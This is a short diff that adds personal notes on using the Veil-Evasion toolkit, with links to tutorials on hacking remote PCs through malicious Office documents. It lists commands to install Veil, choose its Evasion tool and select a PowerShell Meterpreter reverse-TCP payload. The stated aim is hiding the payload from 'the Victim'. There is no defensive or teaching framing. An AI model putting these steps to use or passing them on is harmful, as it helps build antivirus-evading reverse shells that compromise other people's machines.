@@ -1,0 +1,15 @@
+old version veil-evasion  (https://www.hackingarticles.in/hack-remote-pc-using-malicious-ms-office-documents/)
+
+https://www.geeksforgeeks.org/creating-an-undetectable-payload-using-veil-evasion-toolkit/
+
+sudo apt update
+apt install veil
+veil
+update
+
+After updating, you will see two available tools. The first tool is the Evasion tool and the second tool is the Ordnance tool. We are going to use the Evasion tool.
+This tool provides functionalities like evading or hiding Our Payload from Being Captured by the Victim.
+use 1
+list
+payload id-24
+use powershell/meterpreter/rev_tcp
